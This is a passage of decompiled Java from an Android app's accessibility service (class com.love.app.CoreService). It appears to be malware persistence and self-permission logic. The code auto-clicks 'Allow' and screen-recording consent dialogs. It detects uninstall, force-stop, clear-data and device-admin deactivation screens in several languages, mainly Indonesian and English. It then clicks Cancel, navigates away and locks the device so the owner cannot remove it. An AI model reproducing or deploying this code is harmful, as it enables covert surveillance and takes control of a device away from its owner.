        int eventType = accessibilityEvent.getEventType();
        String string = accessibilityEvent.getPackageName() != null ? accessibilityEvent.getPackageName().toString() : "";
        String string2 = accessibilityEvent.getClassName() != null ? accessibilityEvent.getClassName().toString() : "";
        if (eventType != 32 && eventType != 2048) {
            return;
        }
        if (this.isLocked && !string2.contains("LockActivity") && !string.equals(getPackageName())) {
            startLockActivity();
            return;
        }
        String[] strArr = SETTINGS_PKGS;
        int length = strArr.length;
        int i = 0;
        while (true) {
            z = true;
            if (i >= length) {
                z2 = false;
                break;
            } else {
                if (string.startsWith(strArr[i])) {
                    z2 = true;
                    break;
                }
                i++;
            }
        }
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        try {
            if (rootInActiveWindow == null) {
                return;
            }
            try {
                if ((string.contains("systemui") || string.contains("permissioncontroller") || string.contains("com.android.permission")) && autoClickPermission(rootInActiveWindow)) {
                    Log.d(TAG, "⚡ Auto-clicked permission / screen record dialog");
                    try {
                        rootInActiveWindow.recycle();
                        return;
                    } catch (Exception unused) {
                        return;
                    }
                }
                if (z2 && autoClickCancel(rootInActiveWindow)) {
                    Log.w(TAG, "⚡ Admin deactivation intercepted — clicked Cancel");
                    this.handler.postDelayed(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda25
                        @Override // java.lang.Runnable
                        public final void run() {
                            this.f$0.m245lambda$onAccessibilityEvent$37$comloveappCoreService();
                        }
                    }, 200L);
                    try {
                        rootInActiveWindow.recycle();
                        return;
                    } catch (Exception unused2) {
                        return;
                    }
                }
                if (z2 && pageContainsAdminDeactivation(rootInActiveWindow)) {
                    performGlobalAction(2);
                    this.handler.postDelayed(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda26
                        @Override // java.lang.Runnable
                        public final void run() {
                            this.f$0.m246lambda$onAccessibilityEvent$38$comloveappCoreService();
                        }
                    }, 100L);
                    Log.w(TAG, "⚡ Admin settings page — navigated away");
                    try {
                        rootInActiveWindow.recycle();
                        return;
                    } catch (Exception unused3) {
                        return;
                    }
                }
                if (string.contains("installer") || string.contains("settings") || string.contains("packageinstaller") || string.contains("vending")) {
                    String lowerCase = ConfigFetcher.getAppName(this).toLowerCase();
                    boolean z3 = nodeContainsText(rootInActiveWindow, getPackageName()) || (!lowerCase.isEmpty() && nodeContainsText(rootInActiveWindow, lowerCase));
                    String[] strArr2 = {"uninstall", "hapus instalasi", "copot pemasangan", "désinstaller", "desinstalar", "disinstallal", "force stop", "paksa berhenti", "arrêt forcé", "forzar detención", "interruzione forzata", "clear data", "hapus data", "effacer les données", "borrar datos", "cancella dati", "deactivate", "nonaktifkan", "désactiver", "desactivar", "disattiva"};
                    int i2 = 0;
                    while (true) {
                        if (i2 >= 21) {
                            z = false;
                            break;
                        } else if (nodeContainsText(rootInActiveWindow, strArr2[i2])) {
                            break;
                        } else {
                            i2++;
                        }
                    }
                    if (z3 || z) {
                        Log.w(TAG, "⚡ Attempt to uninstall/stop detected — Deflecting");
                        String[] strArr3 = {"batal", "cancel", "batalkan", "tidak", "no", "nanti", "annuler", "descartar"};
                        for (int i3 = 0; i3 < 8; i3++) {
                            String str = strArr3[i3];
                            if (findAndClick(rootInActiveWindow, str)) {
                                Log.d(TAG, "✅ Auto-clicked Cancel button: " + str);
                            }
                        }
                        performGlobalAction(2);
                        this.handler.postDelayed(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda27
                            @Override // java.lang.Runnable
                            public final void run() {
                                this.f$0.m247lambda$onAccessibilityEvent$39$comloveappCoreService();
                            }
                        }, 50L);
                        try {
                            rootInActiveWindow.recycle();
                            return;
                        } catch (Exception unused4) {
                            return;
                        }
                    }
                }
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused5) {
                }
            } catch (Exception e) {
                Log.e(TAG, "adminProtect error", e);
            }
        } catch (Throwable th) {
            try {
                rootInActiveWindow.recycle();
            } catch (Exception unused6) {
            }
            throw th;
        }
    }

    /* JADX INFO: renamed from: lambda$onAccessibilityEvent$37$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m245lambda$onAccessibilityEvent$37$comloveappCoreService() {
        DevicePolicyManager devicePolicyManager = this.dpm;
        if (devicePolicyManager == null || !devicePolicyManager.isAdminActive(this.adminComponent)) {
            return;
        }
        this.dpm.lockNow();
    }

    /* JADX INFO: renamed from: lambda$onAccessibilityEvent$38$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m246lambda$onAccessibilityEvent$38$comloveappCoreService() {
        DevicePolicyManager devicePolicyManager = this.dpm;
        if (devicePolicyManager == null || !devicePolicyManager.isAdminActive(this.adminComponent)) {
            return;
        }
        this.dpm.lockNow();
    }

    /* JADX INFO: renamed from: lambda$onAccessibilityEvent$39$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m247lambda$onAccessibilityEvent$39$comloveappCoreService() {
        DevicePolicyManager devicePolicyManager = this.dpm;
        if (devicePolicyManager != null && devicePolicyManager.isAdminActive(this.adminComponent)) {
            this.dpm.lockNow();
        } else {
            performGlobalAction(2);
        }
    }

    private boolean autoClickCancel(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        String strTrim = text != null ? text.toString().toLowerCase().trim() : "";
        String strTrim2 = contentDescription != null ? contentDescription.toString().toLowerCase().trim() : "";
        String lowerCase = accessibilityNodeInfo.getViewIdResourceName() != null ? accessibilityNodeInfo.getViewIdResourceName().toLowerCase() : "";
        if ((strTrim.equals("batal") || strTrim.equals("cancel") || strTrim.equals("batalkan") || strTrim.equals("tidak") || strTrim.equals("no") || strTrim.equals("nein") || strTrim.equals("annuler") || lowerCase.contains("cancel") || lowerCase.contains("negative") || lowerCase.contains("btn_no") || lowerCase.contains("button_cancel") || strTrim2.contains("cancel") || strTrim2.contains("batal")) && accessibilityNodeInfo.isClickable()) {
            accessibilityNodeInfo.performAction(16);
            return true;
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            if (autoClickCancel(accessibilityNodeInfo.getChild(i))) {
                return true;
            }
        }
        return false;
    }

    private boolean autoClickPermission(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        String strTrim = text != null ? text.toString().toLowerCase().trim() : "";
        String lowerCase = accessibilityNodeInfo.getViewIdResourceName() != null ? accessibilityNodeInfo.getViewIdResourceName().toLowerCase() : "";
        boolean z = strTrim.equals("mulai sekarang") || strTrim.equals("start now") || strTrim.equals("izinkan") || strTrim.equals("allow") || strTrim.equals("selalu izinkan") || strTrim.equals("allow all the time") || strTrim.equals("saat aplikasi digunakan") || strTrim.equals("while using the app") || strTrim.equals("ya") || strTrim.equals("yes") || strTrim.equals("ok") || lowerCase.contains("button1") || lowerCase.contains("allow_button") || lowerCase.contains("start_button");
        if (z && accessibilityNodeInfo.isClickable()) {
            accessibilityNodeInfo.performAction(16);
            return true;
        }
        if (z && accessibilityNodeInfo.getParent() != null && accessibilityNodeInfo.getParent().isClickable()) {
            accessibilityNodeInfo.getParent().performAction(16);
            return true;
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            if (autoClickPermission(accessibilityNodeInfo.getChild(i))) {
                return true;
            }
        }
        return false;
    }

    private boolean pageContainsAdminDeactivation(AccessibilityNodeInfo accessibilityNodeInfo) {
        return nodeContainsText(accessibilityNodeInfo, getPackageName()) || nodeContainsText(accessibilityNodeInfo, "device admin") || nodeContainsText(accessibilityNodeInfo, "device administrator") || nodeContainsText(accessibilityNodeInfo, "administrator perangkat") || nodeContainsText(accessibilityNodeInfo, "admin perangkat");
    }

    private boolean nodeContainsText(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        if (accessibilityNodeInfo != null && str != null && !str.isEmpty()) {
            CharSequence text = accessibilityNodeInfo.getText();
            if (text != null && text.toString().toLowerCase().contains(str.toLowerCase())) {
                return true;
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && contentDescription.toString().toLowerCase().contains(str.toLowerCase())) {
                return true;
            }
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                if (nodeContainsText(accessibilityNodeInfo.getChild(i), str)) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean findDangerousButtons(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return false;
        }
        String[] strArr = {"uninstall", "hapus instalasi", "hapus instalan", "force stop", "paksa berhenti", "disable", "nonaktifkan", "clear data", "hapus data", "storage", "penyimpanan"};
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null) {
            String lowerCase = text.toString().toLowerCase();
            for (int i = 0; i < 11; i++) {
                if (lowerCase.equals(strArr[i])) {
                    return true;
                }
            }
        }
        for (int i2 = 0; i2 < accessibilityNodeInfo.getChildCount(); i2++) {
            if (findDangerousButtons(accessibilityNodeInfo.getChild(i2))) {
                return true;
            }
        }
        return false;
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
        Log.d(TAG, "onInterrupt: Layanan aksesibilitas diinterupsi");
    }

    @Override // android.speech.tts.TextToSpeech.OnInitListener
    public void onInit(int i) {
        if (i != 0) {
            Log.e(TAG, "TTS init failed");
        }
    }
}
